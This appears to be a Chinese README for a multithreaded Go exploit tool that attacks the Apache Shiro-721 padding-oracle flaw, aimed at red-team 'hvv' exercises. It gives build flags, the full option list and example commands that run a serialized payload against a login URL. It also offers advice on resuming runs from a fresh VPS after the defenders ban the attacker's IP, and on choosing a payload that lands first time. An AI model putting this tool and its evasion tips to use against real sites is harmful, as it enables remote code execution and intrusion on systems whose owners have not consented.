# 简介

hvv红队渗透测试工具, Go版本的多线程Shiro-721(PaddingOracle)利用工具

# 使用场景

> 一般用于: 你在hvv时发现了一个带Shiro-721漏洞的站, 但是苦于现有exp都是单线程的, 而且崩了要重新开始跑, 好不容易跑出来了结果还TM不能用, 最后跑的心态爆炸还没日下来的情况.

# 特点

- go语言编写, 方便快速的在各种平台编译运行, 无依赖, 不需要装jdk/jre之类的运行时环境
- 有"错误补偿"机制, 基本上只要能跑出结果就一定是可用的(实现方法可以看下源码~)
- 支持多线程(一般给个15-60线程就差不多了, 具体参数需要根据实际情况微调)
- 支持后端带负载均衡节点的情况
- 支持后端带负载均衡节点, 但是其中一个或多个节点还TM不可用的情况
- 支持后端带负载均衡节点, 但是其中一个或多个节点用的还TM不是相同的SecretKey的情况
- 支持"断点续传", 比如你在本机跑了一半了, 突然电脑蓝屏了(or 五国了), 恢复之后可以接着刚才的进度继续跑
- 支持"断点续传", 比如你在VPS上跑了一半了, 然后蓝队突然把你VPS的IP给Ban了, 然后VPS提供商还TM不给换IP, 这时你可以带着session文件换个VPS继续跑
- 支持随机(or 自定义)`padding byte`
- 支持设置"重试次数"(一般用于后端有多个负载节点, 但是只有部分个负载节点能正确响应的情况)
- 支持设置在恢复会话的时候从指定的block开始跑
- 支持设置"超时时间", 比如后端节点有三台响应的非常快, 有一台响应的特别慢, 这时可以设置"超时时间"来避开响应慢的那台

# 编译方式

`go build -trimpath -ldflags "-s -w"`

# 使用方式

## 参数

```
$ ./ShiroPaddingOracle                                            
Usage of ./ShiroPaddingOracle:
  -a int    // 重试次数, 需要根据后端节点数量和质量进行微调
        number of attempts (default 15)
  -b int    // 一般默认就好
        block size (default 16)
  -c int    // 调试用的, 一般默认(随机)就好
        custom padding byte
  -d int    // 单个HTTP请求的超时时间, 根据目标响应速度微调
        timeout seconds (default 3)
  -i string // 指定存放合法rememberMe数据的文件
        rememberMe data file (default "rememberMe.txt") 
  -p string // 指定 payload 文件
        payload data file (default "payload.ser") 
  -r string // 指定会话文件继续跑或者查看结果
        load session file to restore
  -s string // 指定会话文件的文件名, 一般默认就好
        session file
  -t int    // 并发线程数
        number of threads (default 16)
  -u string // 目标地址
        target url
  -v    verbose // 详细模式, 一般用于调试

```

## 新建会话

`./ShiroPaddingOracle-darwin-arm64 -u http://127.0.0.1:8081/jeesite/a/login -p foobar.class -i rememberMe.txt -t 64`

- `-u` 目标地址: http://127.0.0.1:8081/jeesite/a/login
- `-p` Payload文件: foobar.class (咋生成应该不用我说吧..)
- `-i` rememberMe数据文件: rememberMe.txt
- `-t` 线程数: 64

## 恢复会话

`./ShiroPaddingOracle-darwin-arm64 -r 2022-01-07_13-33-17.session`

- 从`2022-01-07_13-33-17.session`这个文件恢复会话继续跑或者查看跑完的结果

# 注意事项

- 打目标之前建议先本地搭建环境测试
- 选个靠谱的payload, 争取一次成功, 不然白跑, 而且目标硬盘可能会被日志塞满
- 线程数不要设的太高, 不要影响目标的正常业务
- 跑的时候尽量看是看着点, 不然IP被Ban了还继续跑浪费时间
- 具体使用细节请看源码
